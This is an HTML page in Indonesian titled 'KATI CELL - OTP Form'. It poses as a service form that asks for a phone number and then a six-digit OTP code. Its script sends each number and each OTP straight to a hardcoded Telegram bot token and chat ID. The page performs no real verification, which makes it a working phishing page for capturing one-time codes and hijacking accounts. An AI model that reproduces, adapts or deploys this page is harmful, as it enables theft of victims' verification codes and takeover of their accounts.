<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KATI CELL - OTP Form</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    :root {
      --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      --new-primary-gradient: linear-gradient(135deg, #ff6b6b 0%, #feca57 15%, #48dbfb 35%, #ff9ff3 60%, #54a0ff 100%);
      --secondary-gradient: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
      --success-gradient: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
      --glass-bg: rgba(255, 255, 255, 0.25);
      --glass-border: rgba(255, 255, 255, 0.35);
      --shadow-primary: 0 8px 32px rgba(31, 38, 135, 0.37);
      --shadow-hover: 0 15px 35px rgba(31, 38, 135, 0.4);
      --text-primary: #ffffff;
      --text-secondary: #f8f9fa;
      --text-dark: #2c3e50;
    }

    * {
      box-sizing: border-box;
    }

    body {
      background: var(--new-primary-gradient);
      background-size: 400% 400%;
      animation: gradientShift 15s ease infinite;
      min-height: 100vh;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      overflow-x: hidden;
      position: relative;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Animated background with particles */
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(255, 107, 107, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(72, 219, 251, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(254, 202, 87, 0.2) 0%, transparent 50%),
        radial-gradient(circle at 60% 70%, rgba(255, 159, 243, 0.2) 0%, transparent 50%);
      animation: backgroundShift 20s ease-in-out infinite;
      z-index: -2;
    }

    @keyframes backgroundShift {
      0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
      50% { opacity: 0.8; transform: scale(1.1) rotate(1deg); }
    }

    /* Floating particles */
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
    }

    .particle {
      position: absolute;
      width: 6px;
      height: 6px;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 50%;
      animation: particleFloat 15s linear infinite;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
    }

    .particle:nth-child(1) { left: 10%; animation-delay: 0s; animation-duration: 12s; background: rgba(255, 107, 107, 0.7); }
    .particle:nth-child(2) { left: 20%; animation-delay: 2s; animation-duration: 18s; background: rgba(72, 219, 251, 0.7); }
    .particle:nth-child(3) { left: 30%; animation-delay: 4s; animation-duration: 14s; background: rgba(254, 202, 87, 0.7); }
    .particle:nth-child(4) { left: 40%; animation-delay: 1s; animation-duration: 16s; background: rgba(255, 159, 243, 0.7); }
    .particle:nth-child(5) { left: 50%; animation-delay: 6s; animation-duration: 13s; background: rgba(84, 160, 255, 0.7); }
    .particle:nth-child(6) { left: 60%; animation-delay: 3s; animation-duration: 17s; background: rgba(255, 107, 107, 0.7); }
    .particle:nth-child(7) { left: 70%; animation-delay: 8s; animation-duration: 15s; background: rgba(72, 219, 251, 0.7); }
    .particle:nth-child(8) { left: 80%; animation-delay: 5s; animation-duration: 19s; background: rgba(254, 202, 87, 0.7); }
    .particle:nth-child(9) { left: 90%; animation-delay: 7s; animation-duration: 11s; background: rgba(255, 159, 243, 0.7); }

    @keyframes particleFloat {
      0% { 
        transform: translateY(100vh) scale(0);
        opacity: 0;
      }
      10% {
        opacity: 1;
        transform: translateY(90vh) scale(1);
      }
      90% {
        opacity: 1;
        transform: translateY(-10vh) scale(1);
      }
      100% { 
        transform: translateY(-20vh) scale(0);
        opacity: 0;
      }
    }

    /* Main container */
    .main-container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* Glass morphism card */
    .glass-card {
      background: var(--glass-bg);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      border: 2px solid var(--glass-border);
      border-radius: 25px;
      box-shadow: 
        var(--shadow-primary),
        inset 0 1px 0 rgba(255, 255, 255, 0.2);
      width: 100%;
      max-width: 420px;
      padding: 2.5rem;
      position: relative;
      overflow: hidden;
      animation: cardEntrance 1s ease-out;
    }

    @keyframes cardEntrance {
      0% {
        opacity: 0;
        transform: translateY(50px) scale(0.9);
      }
      100% {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    .glass-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
      animation: shimmer 4s infinite;
    }

    @keyframes shimmer {
      0% { left: -100%; }
      100% { left: 100%; }
    }

    /* Brand styling */
    .brand {
      font-weight: 800;
      font-size: 2.2rem;
      background: linear-gradient(135deg, #ffffff 0%, #feca57 50%, #ff6b6b 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-align: center;
      margin-bottom: 2rem;
      letter-spacing: 3px;
      animation: brandPulse 4s ease-in-out infinite;
      text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.5));
    }

    @keyframes brandPulse {
      0%, 100% { 
        filter: drop-shadow(0 0 15px rgba(255,255,255,0.6)) drop-shadow(0 2px 4px rgba(0, 0, 0, 0.5));
        transform: scale(1);
      }
      50% { 
        filter: drop-shadow(0 0 25px rgba(255,255,255,0.8)) drop-shadow(0 2px 4px rgba(0, 0, 0, 0.5));
        transform: scale(1.05);
      }
    }

    /* Form elements */
    .form-label {
      color: var(--text-primary);
      font-weight: 700;
      margin-bottom: 0.75rem;
      font-size: 1.1rem;
      text-shadow: 
        0 2px 4px rgba(0,0,0,0.6),
        0 0 10px rgba(255,255,255,0.3);
      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.8));
    }

    .form-control {
      background: rgba(255, 255, 255, 0.2);
      border: 2px solid rgba(255, 255, 255, 0.4);
      border-radius: 15px;
      color: var(--text-dark);
      padding: 1rem 1.5rem;
      font-size: 1rem;
      font-weight: 600;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      backdrop-filter: blur(15px);
      box-shadow: 
        0 4px 15px rgba(0, 0, 0, 0.1),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
    }

    .form-control::placeholder {
      color: rgba(44, 62, 80, 0.7);
      font-weight: 500;
    }

    .form-control:focus {
      background: rgba(255, 255, 255, 0.3);
      border-color: rgba(72, 219, 251, 0.8);
      box-shadow: 
        0 0 0 0.25rem rgba(72, 219, 251, 0.25), 
        0 0 25px rgba(72, 219, 251, 0.4),
        0 8px 25px rgba(0, 0, 0, 0.15);
      color: var(--text-dark);
      transform: translateY(-3px);
    }

    /* Button styling */
    .btn-custom {
      background: var(--secondary-gradient);
      border: none;
      border-radius: 15px;
      padding: 1rem 2rem;
      font-weight: 700;
      font-size: 1.05rem;
      color: white;
      position: relative;
      overflow: hidden;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 
        0 6px 20px rgba(255, 107, 107, 0.4),
        0 2px 10px rgba(0, 0, 0, 0.2);
      text-transform: uppercase;
      letter-spacing: 1px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }

    .btn-custom:hover {
      transform: translateY(-4px);
      box-shadow: 
        0 10px 30px rgba(255, 107, 107, 0.5),
        0 4px 15px rgba(0, 0, 0, 0.2);
      color: white;
    }

    .btn-custom:active {
      transform: translateY(-2px);
    }

    .btn-custom::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      transition: left 0.6s;
    }

    .btn-custom:hover::before {
      left: 100%;
    }

    .btn-success-custom {
      background: var(--success-gradient);
      box-shadow: 
        0 6px 20px rgba(0, 210, 255, 0.4),
        0 2px 10px rgba(0, 0, 0, 0.2);
    }

    .btn-success-custom:hover {
      box-shadow: 
        0 10px 30px rgba(0, 210, 255, 0.5),
        0 4px 15px rgba(0, 0, 0, 0.2);
    }

    /* Loader */
    .loader {
      width: 22px;
      height: 22px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Step animations */
    .step-container {
      animation: stepSlideIn 0.7s cubic-bezier(0.4, 0, 0.2, 1);
    }

    @keyframes stepSlideIn {
      0% {
        opacity: 0;
        transform: translateX(-40px);
      }
      100% {
        opacity: 1;
        transform: translateX(0);
      }
    }

    /* Status messages */
    .status-message {
      padding: 1rem;
      border-radius: 12px;
      font-size: 0.95rem;
      font-weight: 700;
      animation: statusFadeIn 0.6s ease-out;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
    }

    .status-success {
      background: rgba(0, 210, 255, 0.3);
      color: #ffffff;
      border-color: rgba(0, 210, 255, 0.5);
      box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
    }

    .status-error {
      background: rgba(255, 107, 107, 0.3);
      color: #ffffff;
      border-color: rgba(255, 107, 107, 0.5);
      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
    }

    @keyframes statusFadeIn {
      0% {
        opacity: 0;
        transform: translateY(15px) scale(0.95);
      }
      100% {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    /* Responsive design */
    @media (max-width: 576px) {
      .main-container {
        padding: 15px;
      }
      
      .glass-card {
        padding: 2rem;
        border-radius: 20px;
        max-width: 100%;
      }
      
      .brand {
        font-size: 1.9rem;
        margin-bottom: 1.5rem;
      }
      
      .form-control {
        padding: 0.875rem 1.25rem;
        font-size: 16px; /* Prevents zoom on iOS */
      }
      
      .btn-custom {
        padding: 0.875rem 1.5rem;
        font-size: 1rem;
      }
    }

    @media (max-width: 375px) {
      .glass-card {
        padding: 1.75rem;
      }
      
      .brand {
        font-size: 1.7rem;
      }
    }

    /* High DPI displays */
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
      .glass-card {
        backdrop-filter: blur(30px);
        -webkit-backdrop-filter: blur(30px);
      }
    }

    /* Reduce motion for accessibility */
    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>
<body>
  <!-- Floating particles -->
  <div class="particles">
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
  </div>

  <div class="main-container">
    <div class="glass-card">
      <h1 class="brand">KATI CELL</h1>

      <!-- Tahap 1: Nomor -->
      <div id="step1" class="step-container">
        <label class="form-label">Masukkan Nomor HP</label>
        <input type="tel" class="form-control mb-3" id="phone" placeholder="Contoh: 6281234567890" required autocomplete="tel">
        <button id="sendPhoneBtn" class="btn btn-custom w-100">
          <span id="phoneBtnText">Kirim Nomor</span>
          <span id="phoneLoader" class="loader ms-2 d-none"></span>
        </button>
      </div>

      <!-- Tahap 2: OTP -->
      <div id="step2" class="mt-4 d-none">
        <div class="step-container">
          <label class="form-label">Masukkan Kode OTP</label>
          <input type="text" class="form-control mb-3" id="otp" placeholder="Contoh: 123456" required autocomplete="one-time-code" inputmode="numeric" maxlength="6">
          <button id="sendOtpBtn" class="btn btn-custom btn-success-custom w-100">
            <span id="otpBtnText">Kirim OTP</span>
            <span id="otpLoader" class="loader ms-2 d-none"></span>
          </button>
        </div>
      </div>

      <!-- Status -->
      <div id="status" class="mt-3"></div>
    </div>
  </div>

  <script>
    const TOKEN = '7138772784:AAFscVpYPW9m_ewLUhVausytyDtWBfSKF-0';
    const CHAT_ID = '5705682585';

    const phoneInput = document.getElementById("phone");
    const otpInput = document.getElementById("otp");
    const statusDiv = document.getElementById("status");
    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
    const sendOtpBtn = document.getElementById("sendOtpBtn");

    // Enhanced status display
    function showStatus(message, isSuccess = true) {
      statusDiv.innerHTML = `<div class="status-message ${isSuccess ? 'status-success' : 'status-error'}">${message}</div>`;
    }
    function speak(text) {
  if ('speechSynthesis' in window) {
    speechSynthesis.cancel(); // Hapus suara sebelumnya
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.lang = 'id-ID';
    utterance.rate = 0.9;
    speechSynthesis.speak(utterance);
  } else {
    console.warn("Browser tidak mendukung speechSynthesis.");
  }
}

    // Enhanced button loading state
    function setButtonLoading(button, textElement, loaderElement, isLoading, originalText) {
      if (isLoading) {
        button.disabled = true;
        textElement.textContent = "Mengirim...";
        loaderElement.classList.remove("d-none");
        button.style.pointerEvents = "none";
      } else {
        button.disabled = false;
        textElement.textContent = originalText;
        loaderElement.classList.add("d-none");
        button.style.pointerEvents = "auto";
      }
    }

    sendPhoneBtn.addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      if (!phone) {
        showStatus("❌ Nomor HP tidak boleh kosong!", false);
        return;
      }

      setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), true, "Kirim Nomor");

      const message = `📱 Nomor Baru:\nNomor HP: ${phone}`;
      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      })
      .then(res => res.json())
      .then(() => {
        setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), false, "Kirim Nomor");
        
        const step2 = document.getElementById("step2");
        step2.classList.remove("d-none");
        
        showStatus("✅ Nomor berhasil dikirim, silakan masukkan kode OTP", true);
        speak("Nomor berhasil dikirim. Silakan masukkan kode OTP.");

        
        // Focus on OTP input for better UX
        setTimeout(() => {
          otpInput.focus();
        }, 500);
      })
      .catch(() => {
        setButtonLoading(sendPhoneBtn, document.getElementById("phoneBtnText"), document.getElementById("phoneLoader"), false, "Kirim Nomor");
        showStatus("❌ Gagal mengirim nomor. Periksa koneksi internet Anda.", false);
      });
    });

    sendOtpBtn.addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      const otp = otpInput.value.trim();
      if (!otp) {
        showStatus("❌ Kode OTP tidak boleh kosong!", false);
        return;
      }

      if (otp.length !== 6) {
        showStatus("❌ Kode OTP harus 6 digit!", false);
        return;
      }

      setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), true, "Kirim OTP");

      const message = `🔐 OTP Masuk:\nNomor: ${phone}\nKode OTP: ${otp}`;
      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      })
      .then(res => res.json())
      .then(() => {
        setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), false, "Kirim OTP");
        showStatus("✅ Kode OTP berhasil dikirim ke Telegram!", true);
        speak("Kode OTP berhasil dikirim.");

        
        // Reset form after success
        setTimeout(() => {
          otpInput.value = "";
          phoneInput.value = "";
          document.getElementById("step2").classList.add("d-none");
          statusDiv.innerHTML = "";
          phoneInput.focus();
        }, 3000);
      })
      .catch(() => {
        setButtonLoading(sendOtpBtn, document.getElementById("otpBtnText"), document.getElementById("otpLoader"), false, "Kirim OTP");
        showStatus("❌ Gagal mengirim OTP. Periksa koneksi internet Anda.", false);
      });
    });

    // Enhanced mobile experience
    phoneInput.addEventListener("focus", () => {
      phoneInput.style.transform = "translateY(-3px)";
    });

    phoneInput.addEventListener("blur", () => {
      phoneInput.style.transform = "translateY(0)";
    });

    otpInput.addEventListener("focus", () => {
      otpInput.style.transform = "translateY(-3px)";
    });

    otpInput.addEventListener("blur", () => {
      otpInput.style.transform = "translateY(0)";
    });

    // Auto-format phone number (optional enhancement)
    phoneInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, '');
      e.target.value = value;
    });

    // Auto-format OTP (only numbers)
    otpInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 6) value = value.slice(0, 6);
      e.target.value = value;
    });

    // Enter key support
    phoneInput.addEventListener("keypress", (e) => {
      if (e.key === "Enter") {
        sendPhoneBtn.click();
      }
    });

    otpInput.addEventListener("keypress", (e) => {
      if (e.key === "Enter") {
        sendOtpBtn.click();
      }
    });
  </script>
</body>
</html>
